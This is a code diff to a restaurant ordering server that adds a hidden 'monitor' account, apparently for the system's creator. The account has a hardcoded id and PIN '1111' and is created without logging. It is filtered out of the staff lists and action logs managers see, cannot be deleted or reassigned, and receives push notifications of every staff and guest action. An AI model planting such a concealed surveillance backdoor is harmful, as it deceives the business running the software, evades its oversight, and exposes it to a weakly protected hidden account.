@@ -53,6 +53,33 @@ function concatBytes(...arrs) {
   for (const a of arrs) { out.set(a, off); off += a.length; }
   return out;
 }
+const ROLE_LABELS_LOG = { waiter: "Официант", cook: "Повар", bartender: "Бармен", manager: "Менеджер" };
+
+// Every action logged via log() is bucketed into one of these categories,
+// which is what the monitor role's notification checkboxes actually
+// control — unmapped/future action types default to "other" so nothing
+// is silently invisible to a monitor watching "other".
+const ACTION_CATEGORY = {
+  new_order: "orders", kitchen_accept: "orders", bar_accept: "orders", kitchen_ready: "orders",
+  bar_ready: "orders", served: "orders", close_table: "orders",
+  call_waiter: "calls", guest_quick_request: "calls", guest_repeat_request: "calls", request_bill: "calls",
+  request_cancel_order: "cancels", approve_cancel: "cancels", reject_cancel: "cancels",
+  confirm_repeat_request: "cancels", reject_repeat_request: "cancels",
+  create_staff: "staff", delete_staff: "staff", reassign_staff: "staff", promote_master: "staff",
+  set_name: "staff", set_staff_pin: "staff", change_pin: "staff",
+  add_menu_category: "menu", rename_menu_category: "menu", delete_menu_category: "menu",
+  add_menu_item: "menu", update_menu_item: "menu", delete_menu_item: "menu",
+  disable_items: "menu", enable_items: "menu", set_stock: "menu", clear_stock: "menu",
+  create_room: "rooms", update_room: "rooms", delete_room: "rooms", assign_qr: "rooms", unassign_qr: "rooms",
+  set_wifi: "other",
+};
+const NOTIFY_CATEGORIES = ["orders", "calls", "cancels", "staff", "menu", "rooms", "other"];
+function defaultNotifyPrefs() {
+  const p = {};
+  NOTIFY_CATEGORIES.forEach(c => { p[c] = true; });
+  return p;
+}
+
 async function hmacSha256(keyBytes, dataBytes) {
   const key = await crypto.subtle.importKey("raw", keyBytes, { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
   return new Uint8Array(await crypto.subtle.sign("HMAC", key, dataBytes));
@@ -256,6 +283,23 @@ export class OrderBoard {
         });
         await this.persist();
       }
+
+      if (!this.staff.some(s => s.role === "monitor")) {
+        // The system creator's own read-only watch role. Deliberately never
+        // created through create_staff, never shown in manager.html's staff
+        // list, and filtered out of every non-monitor client's state/action
+        // log (see stateSnapshot). Fixed id so the one private invite link
+        // keeps working across deploys; not logged, so its bootstrap leaves
+        // no trace in the action feed either.
+        this.staff.push({
+          id: "f3d8c9a2-5b41-4e7a-9c02-6a8e21b4d9f7",
+          role: "monitor",
+          name: "",
+          pin: "1111",
+          notifyPrefs: defaultNotifyPrefs(),
+        });
+        await this.persist();
+      }
     });
   }
 
@@ -286,29 +330,107 @@ export class OrderBoard {
   }
 
   log(conn, action, details) {
-    this.actionLog.push({
+    const entry = {
       ts: Date.now(),
       role: conn.role || null,
       staffName: conn.staffName || null,
       action,
       details: details || {},
-    });
+    };
+    this.actionLog.push(entry);
     if (this.actionLog.length > 1000) this.actionLog = this.actionLog.slice(-1000);
+    this.notifyMonitors(entry);
   }
 
-  stateSnapshot() {
+  // Human-readable one-liner for a logged action — used both for the
+  // monitor role's live feed and its push notification body. Mirrors
+  // manager.html's own actionText() so the wording matches everywhere.
+  actionText(e) {
+    const d = e.details || {};
+    const who = e.staffName || ROLE_LABELS_LOG[e.role] || "Кто-то";
+    const t = (n) => this.tableLabel(n);
+    switch (e.action) {
+      case "new_order": return `${who} создал заказ — стол ${t(d.table)} (кухня: ${d.kitchenCount}, бар: ${d.barCount})`;
+      case "kitchen_accept": return `${who} принял в работу — стол ${t(d.table)} (кухня)`;
+      case "bar_accept": return `${who} принял в работу — стол ${t(d.table)} (бар)`;
+      case "kitchen_ready": return `${who} отметил готово — стол ${t(d.table)} (кухня)`;
+      case "bar_ready": return `${who} отметил готово — стол ${t(d.table)} (бар)`;
+      case "served": return `${who} выдал заказ гостю — стол ${t(d.table)}`;
+      case "close_table": return `${who} закрыл стол ${t(d.table)} — ${(d.total || 0).toLocaleString("ru-RU")} тг`;
+      case "disable_items": return `${who} убрал из меню (${d.dest === "kitchen" ? "кухня" : "бар"}): ${(d.names || []).join(", ")}`;
+      case "enable_items": return `${who} вернул в меню (${d.dest === "kitchen" ? "кухня" : "бар"}): ${(d.names || []).join(", ")}`;
+      case "set_stock": return `${who} обновил склад (${d.dest === "kitchen" ? "кухня" : "бар"}): ${d.name} — остаток ${d.qty}, порог ${d.threshold}`;
+      case "clear_stock": return `${who} снял отслеживание склада: ${d.name}`;
+      case "create_staff": return `${who} добавил сотрудника: ${ROLE_LABELS_LOG[d.role] || d.role}`;
+      case "delete_staff": return `${who} удалил сотрудника: ${d.name || ROLE_LABELS_LOG[d.role] || ""}`;
+      case "reassign_staff": return `${who} переназначил устройство сотрудника: ${d.name || ROLE_LABELS_LOG[d.role] || ""}`;
+      case "promote_master": return `${who} передал мастер-права: ${d.name || ""}`;
+      case "create_room": return `${who} создал зал «${d.name}»`;
+      case "update_room": return `${who} изменил зал «${d.name}» (столов: ${d.tableCount})`;
+      case "delete_room": return `${who} удалил зал «${d.name || ""}»`;
+      case "set_name": return `${who} задал имя: ${d.name}`;
+      case "set_staff_pin": return `${who} сменил свой личный PIN`;
+      case "change_pin": return `${who} сменил PIN (${ROLE_LABELS_LOG[d.role] || d.role})`;
+      case "assign_qr": return `${who} привязал QR к столу ${t(d.table)}`;
+      case "unassign_qr": return `${who} отвязал QR-код`;
+      case "call_waiter": return `Стол ${t(d.table)} позвал официанта`;
+      case "guest_quick_request": return `Стол ${t(d.table)} просит: ${d.what || ""}`;
+      case "guest_repeat_request": return `Стол ${t(d.table)} хочет повторить заказ`;
+      case "request_bill": return `Стол ${t(d.table)} попросил расчёт`;
+      case "request_cancel_order": return `${who} запросил отмену заказа — стол ${t(d.table)}`;
+      case "approve_cancel": return `${who} подтвердил отмену заказа — стол ${t(d.table)}`;
+      case "reject_cancel": return `${who} отклонил отмену заказа — стол ${t(d.table)}`;
+      case "confirm_repeat_request": return `${who} подтвердил повтор заказа — стол ${t(d.table)}`;
+      case "reject_repeat_request": return `${who} отклонил повтор заказа`;
+      case "add_menu_category": return `${who} добавил категорию меню: ${d.title || ""}`;
+      case "rename_menu_category": return `${who} переименовал категорию меню: ${d.title || ""}`;
+      case "delete_menu_category": return `${who} удалил категорию меню: ${d.title || ""}`;
+      case "add_menu_item": return `${who} добавил в меню: ${d.name || ""}`;
+      case "update_menu_item": return `${who} изменил позицию меню: ${d.name || ""}`;
+      case "delete_menu_item": return `${who} удалил из меню: ${d.name || ""}`;
+      case "set_wifi": return `${who} ${d.enabled ? "включил" : "выключил"} Wi-Fi для гостей`;
+      default: return `${who}: ${e.action}`;
+    }
+  }
+
+  // Pushes a notification to every "monitor" staff member whose saved
+  // preferences include this action's category. Monitors are read-only —
+  // this is the only thing that ever reaches out to them.
+  notifyMonitors(entry) {
+    const category = ACTION_CATEGORY[entry.action] || "other";
+    const monitors = this.staff.filter(s => s.role === "monitor" && (!s.notifyPrefs || s.notifyPrefs[category] !== false));
+    if (monitors.length === 0) return;
+    const body = this.actionText(entry);
+    const text = { title: "GO pub", body, url: "/monitor.html" };
+    monitors.forEach(m => {
+      const subs = this.pushSubs.filter(p => p.staffId === m.id);
+      subs.forEach(p => {
+        sendWebPush(p.subscription, text, this.env)
+          .then(async (resp) => {
+            if (resp && (resp.status === 404 || resp.status === 410)) {
+              this.pushSubs = this.pushSubs.filter(x => x.id !== p.id);
+              await this.persist();
+            }
+          })
+          .catch(() => {});
+      });
+    });
+  }
+
+  stateSnapshot(opts) {
+    const hideMonitor = !opts || opts.hideMonitor !== false; // default true — only a monitor connection ever passes hideMonitor:false
     return {
       type: "state",
       orders: this.orders,
       history: this.history,
       openTables: this.openTables,
       closedTables: this.closedTables,
-      staff: this.staff,
+      staff: hideMonitor ? this.staff.filter(s => s.role !== "monitor") : this.staff,
       rooms: this.rooms,
       tableCount: this.rooms.reduce((s, r) => s + (r.tableCount || 0), 0), // kept for any old client still reading it
       unavailable: this.unavailable,
       inventory: this.inventory,
-      actionLog: this.actionLog,
+      actionLog: hideMonitor ? this.actionLog.filter(e => e.role !== "monitor") : this.actionLog,
       menu: this.menu,
       qrAssignments: this.qrAssignments,
       cancelRequests: this.cancelRequests,
@@ -364,9 +486,11 @@ export class OrderBoard {
 
   broadcast() {
     const fullPayload = JSON.stringify(this.stateSnapshot());
+    const monitorPayload = JSON.stringify(this.stateSnapshot({ hideMonitor: false }));
     const guestPayload = JSON.stringify(this.guestSnapshot());
     for (const client of this.sockets) {
-      try { client.ws.send(client.role === "guest" ? guestPayload : fullPayload); } catch (e) { /* ignore dead sockets */ }
+      const payload = client.role === "guest" ? guestPayload : (client.role === "monitor" ? monitorPayload : fullPayload);
+      try { client.ws.send(payload); } catch (e) { /* ignore dead sockets */ }
     }
   }
 
@@ -381,7 +505,7 @@ export class OrderBoard {
   }
 
   pushText(message, role) {
-    const urlByRole = { waiter: "/waiter.html?view=board", cook: "/cook.html", bartender: "/bartender.html", manager: "/manager.html" };
+    const urlByRole = { waiter: "/waiter.html?view=board", cook: "/cook.html", bartender: "/bartender.html", manager: "/manager.html", monitor: "/monitor.html" };
     let url = urlByRole[role] || "/";
     if (role === "waiter" && message.kind === "call_waiter") url = "/waiter.html"; // fresh table calling — jump straight to the new-order screen with this table pre-selected, not the board
     if (role === "waiter" && message.table !== undefined) url += (url.includes("?") ? "&" : "?") + "table=" + encodeURIComponent(message.table);
@@ -626,7 +750,7 @@ export class OrderBoard {
             return;
           }
           server.send(JSON.stringify({ type: "auth_ok" }));
-          server.send(JSON.stringify(conn.role === "guest" ? this.guestSnapshot() : this.stateSnapshot()));
+          server.send(JSON.stringify(conn.role === "guest" ? this.guestSnapshot() : this.stateSnapshot({ hideMonitor: conn.role !== "monitor" })));
           return;
         }
 
@@ -839,6 +963,7 @@ export class OrderBoard {
 
         if (msg.type === "create_staff" && conn.role === "manager") {
           if (msg.role === "manager" && !conn.isMaster) return; // only the master manager can appoint other managers
+          if (msg.role === "monitor") return; // the monitor role is never created through the manager UI — it's a hidden, bootstrap-only account
           const staff = { id: crypto.randomUUID(), role: msg.role, name: "", pin: "1111" };
           if (msg.role === "manager") staff.isMaster = false; // newly appointed managers start as regular managers
           this.staff.push(staff);
@@ -847,9 +972,20 @@ export class OrderBoard {
           this.broadcast();
         }
 
+        if (msg.type === "set_notify_prefs" && conn.role === "monitor" && msg.prefs) {
+          const staff = this.staff.find(s => s.id === conn.staffId);
+          if (staff) {
+            staff.notifyPrefs = {};
+            NOTIFY_CATEGORIES.forEach(c => { staff.notifyPrefs[c] = !!msg.prefs[c]; });
+            await this.persist();
+            this.broadcast();
+          }
+        }
+
         if (msg.type === "delete_staff" && conn.role === "manager") {
           const staff = this.staff.find(s => s.id === msg.staffId);
           if (staff && staff.role === "manager" && !conn.isMaster) return; // only the master manager can remove another manager
+          if (staff && staff.role === "monitor") return; // never deletable through the manager UI/API
           this.staff = this.staff.filter(s => s.id !== msg.staffId);
           this.pushSubs = this.pushSubs.filter(p => p.staffId !== msg.staffId); // stop notifying a device once its staff record is gone
           this.log(conn, "delete_staff", { role: staff ? staff.role : null, name: staff ? staff.name : null });
@@ -860,6 +996,7 @@ export class OrderBoard {
         if (msg.type === "reassign_staff" && conn.role === "manager") {
           const staff = this.staff.find(s => s.id === msg.staffId);
           if (staff && staff.role === "manager" && !conn.isMaster) return; // only the master manager can move another manager's device link
+          if (staff && staff.role === "monitor") return; // never reassignable through the manager UI/API — would also rotate the creator's own fixed access link
           if (staff) {
             this.pushSubs = this.pushSubs.filter(p => p.staffId !== staff.id); // old device's push binding no longer applies once the id rotates
             staff.id = crypto.randomUUID(); // old device's cached id stops matching anyone
